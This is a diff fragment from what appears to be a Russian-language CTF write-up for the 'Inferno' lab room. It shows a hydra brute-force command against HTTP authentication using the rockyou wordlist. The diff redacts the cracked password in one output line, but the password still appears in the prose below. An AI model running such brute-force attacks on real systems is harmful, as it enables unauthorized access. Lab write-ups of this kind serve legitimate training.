@@ -114,7 +114,7 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt -f inferno.thm http-get /infe
 ```
 
 ```
-[80][http-get] host: inferno.thm   login: admin   password: dante1
+[80][http-get] host: inferno.thm   login: admin   password: <REDACTED>
 ```
 
 Вводим найденные учетные данные. Нас перекидывает на другую страницу авторизации. Попробуем те же данные(admin:dante1).
